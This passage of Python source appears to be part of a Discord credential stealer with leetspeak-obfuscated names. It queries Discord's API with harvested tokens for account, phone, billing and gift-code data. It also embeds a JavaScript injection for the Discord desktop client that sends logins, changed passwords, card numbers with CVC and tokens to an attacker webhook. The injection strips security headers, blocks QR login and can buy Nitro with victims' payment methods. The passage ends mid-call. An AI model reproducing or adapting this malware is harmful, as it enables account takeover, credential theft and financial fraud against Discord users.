    for v4r_t0k3n_d15c0rd in v4r_t0k3n5:
        v4r_number_discord_account += 1

        try: v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
        except: v4r_api = {"None": "None"}

        v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
        v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
        v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
        v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
        v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
        v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
        v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
        v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

        try:
            if v4r_api.get('premium_type', 'None') == 0:
                v4r_n1tr0_d15c0rd = 'False'
            elif v4r_api.get('premium_type', 'None') == 1:
                v4r_n1tr0_d15c0rd = 'Nitro Classic'
            elif v4r_api.get('premium_type', 'None') == 2:
                v4r_n1tr0_d15c0rd = 'Nitro Boosts'
            elif v4r_api.get('premium_type', 'None') == 3:
                v4r_n1tr0_d15c0rd = 'Nitro Basic'
            else:
                v4r_n1tr0_d15c0rd = 'False'
        except:
            v4r_n1tr0_d15c0rd = "None"

        try: v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
        except: v4r_av4t4r_ur1_d15c0rd = "None"

        try:
            v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_billing_discord:
                v4r_p4ym3nt_m3th0d5_d15c0rd = []

                for v4r_method in v4r_billing_discord:
                    if v4r_method['type'] == 1:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                    else:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
            else:
                v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
        except:
            v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

        try:
            v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_gift_codes:
                v4r_codes = []
                for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                    v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                    v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                    v4r_data = f"Gift: \"{v4r_name}\" Code: \"{v4r_g1ft_c0d35_d15c0rd}\""
                    if len('\n\n'.join(v4r_g1ft_c0d35_d15c0rd)) + len(v4r_data) >= 1024:
                        break
                    v4r_codes.append(v4r_data)
                if len(v4r_codes) > 0:
                    v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                else:
                    v4r_g1ft_c0d35_d15c0rd = "None"
            else:
                v4r_g1ft_c0d35_d15c0rd = "None"
        except:
            v4r_g1ft_c0d35_d15c0rd = "None"
    
        try: v4r_software_name, v4r_path = v4r_token_info.get(v4r_t0k3n_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, v4r_path = "Unknown", "Unknown"

        v4r_file_discord_account = v4r_file_discord_account + f"""
Discord Account n°{str(v4r_number_discord_account)}:
 - Path Found      : {v4r_path}
 - Software        : {v4r_software_name}
 - Token           : {v4r_t0k3n_d15c0rd}
 - Username        : {v4r_u53rn4m3_d15c0rd}
 - Display Name    : {v4r_d15pl4y_n4m3_d15c0rd}
 - Id              : {v4r_us3r_1d_d15c0rd}
 - Email           : {v4r_em4i1_d15c0rd}
 - Email Verified  : {v4r_em4il_v3rifi3d_d15c0rd}
 - Phone           : {v4r_ph0n3_d15c0rd}
 - Nitro           : {v4r_n1tr0_d15c0rd}
 - Language        : {v4r_c0untry_d15c0rd}
 - Billing         : {v4r_p4ym3nt_m3th0d5_d15c0rd}
 - Gift Code       : {v4r_g1ft_c0d35_d15c0rd}
 - Profile Picture : {v4r_av4t4r_ur1_d15c0rd}
 - Multi-Factor Authentication : {v4r_mf4_d15c0rd}
"""
    v4r_zip_file.writestr(f"Discord Accounts ({v4r_number_discord_account}).txt", v4r_file_discord_account)

    return v4r_number_discord_account

v4r_inj3c710n_c0d3 = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def D3f_Di5c0rdInj3c710n():
    import os
    import re
    import subprocess
    import psutil

    v4r_number_discord_injection = "Active"

    def D3f_G3tC0r3(v4r_dir):
        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_modules = v4r_dir + '\\' + v4r_file + '\\modules'
                if not os.path.exists(v4r_modules):
                    continue
                for v4r_file in os.listdir(v4r_modules):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        v4r_core = v4r_modules + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return v4r_core, v4r_file
        return None

    def D3f_St4rtD15c0rd(v4r_dir):
        v4r_update = v4r_dir + '\\Update.exe'
        v4r_executable = v4r_dir.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_app = v4r_dir + '\\' + v4r_file
                if os.path.exists(v4r_app + '\\' + 'modules'):
                    for v4r_file in os.listdir(v4r_app):
                        if v4r_file == v4r_executable:
                            v4r_executable = v4r_app + '\\' + v4r_executable
                            subprocess.call([v4r_update, '--processStart', v4r_executable],
